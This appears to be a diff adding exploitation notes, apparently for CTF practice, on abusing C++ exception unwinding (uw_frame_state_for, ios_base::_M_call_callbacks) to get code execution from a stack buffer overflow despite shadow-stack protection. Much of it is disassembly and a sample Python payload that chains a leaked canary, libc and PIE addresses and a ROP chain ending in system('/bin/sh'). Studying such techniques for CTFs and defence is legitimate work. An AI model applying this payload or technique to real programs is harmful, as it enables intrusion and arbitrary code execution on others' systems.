@@ -1,0 +1,106 @@
+* Stack unwinding and exceptions
+
+C++ implements the try/catch concept. With the advent of shadow stack, only `exit` allowed etc, we can surprisingly
+use the try/catch behind-the-scenes mechanics to still get RCE with a buffer overflow!
+
+When an exception is encountered, the program needs to check through *all* the return addresses on the stack to see if
+any is within a try/catch (and then return to it if it is). This is implemented in `uw_frame_state_for`, where it loops
+through all the RPs and does a bunch of complicated checks, to see if the RP points to a try/catch block.
+
+After finding a valid pointer, it saves the pointer, rewinds everywhere (its very hard to trace), and finally returns
+with the following:
+
+`UNWIND_smtg`
+@code asm
+mov    QWORD PTR [rbp+r8*1+0x8],r9
+mov    rax,QWORD PTR [rbp-0x38]
+mov    rdx,QWORD PTR [rbp-0x30]
+mov    rbx,QWORD PTR [rbp-0x28]
+mov    r12,QWORD PTR [rbp-0x20]
+mov    r13,QWORD PTR [rbp-0x18]
+mov    r14,QWORD PTR [rbp-0x10]
+mov    r15,QWORD PTR [rbp-0x8]
+mov    rbp,QWORD PTR [rbp+0x0]
+mov    rsp,rcx
+pop    rcx
+jmp    rcx
+@end
+
+and a other bunch of stuff im too lazy to find.
+
+If we're in a scenario where we have stack control and can manually trigger an exception, but can't do a simple ROP
+chain for whatever reason, this attack is very viable. A candidate try/catch to jump to is
+`ios_base::_M_call_callbacks(event __e)`:
+
+@code cpp
+void ios_base::_M_call_callbacks(event __e) throw() {
+  _Callback_list* __p = _M_callbacks;
+  while (__p)
+    {
+  __try
+    { (*__p->_M_fn) (__e, *this, __p->_M_index); }
+  __catch(...)
+    { }
+  __p = __p->_M_next;
+    }
+}
+@end
+
+We want to jump within the try block so it thinks the program crashed there. We can jump to right after the function
+call. This is the disassembly. 
+
+@code asm
+endbr64
+push   r12
+push   rbp
+push   rbx
+mov    rbx,QWORD PTR [rdi+0x28]
+test   rbx,rbx
+je     0x55dafea04004 <_ZNSt8ios_base17_M_call_callbacksENS_5eventE+52>
+mov    rbp,rdi
+mov    r12d,esi
+nop    WORD PTR [rax+rax*1+0x0]
+mov    edx,DWORD PTR [rbx+0x10]
+mov    rsi,rbp
+mov    edi,r12d
+call   QWORD PTR [rbx+0x8]
+mov    rbx,QWORD PTR [rbx] // <- we want to jump here
+test   rbx,rbx
+jne    0x55dafea03ff0 <_ZNSt8ios_base17_M_call_callbacksENS_5eventE+32>
+pop    rbx
+pop    rbp
+pop    r12
+ret
+endbr64
+mov    rdi,rax
+jmp    0x55dafe9b7694 <_ZNSt8ios_base17_M_call_callbacksENS_5eventE.cold>
+@end
+
+Because of function name mangling, the GDB name seems to be `_ZNSt8ios_base17_M_call_callbacksENS_5eventE` (but may
+change depending on libstdc++ version).
+
+To pass the `test rbx, rbx` check, `rbx` should initially point to an address with `0x0000000000000000`. Fortunately, we
+can control the value of `rbx` at RP - 0x10, because of the `mov` instructions earlier.
+
+Lastly, we can put our ROP chain 0x18 bytes after the pointer to the try/catch block. Before the ROP chain, make sure
+alternate addresses on the stack point to valid instructions, as it takes every other address during the unwinding.
+
+Sample payload:
+
+@code python
+payload = flat(
+    b"0"*24,
+    canary,
+    b"a"*8,
+    libc_leak - 0x3000, # the empty 0x0000000000000000 pointer
+    b"a"*8, # padding
+    pie_leak + 0x60ffc, # the try/catch dummy gadget
+    # padding to ROP chain
+    rop.ret.address, # valid instruction pointer for unwinding
+    0xdeadbeef, # this one is skipped over
+    rop.ret.address, # valid instruction pointer for unwinding
+    # end padding
+    rop.rdi.address, next(libc.search(b"/bin/sh\x00")),
+    libc.sym.system,
+)
+@end
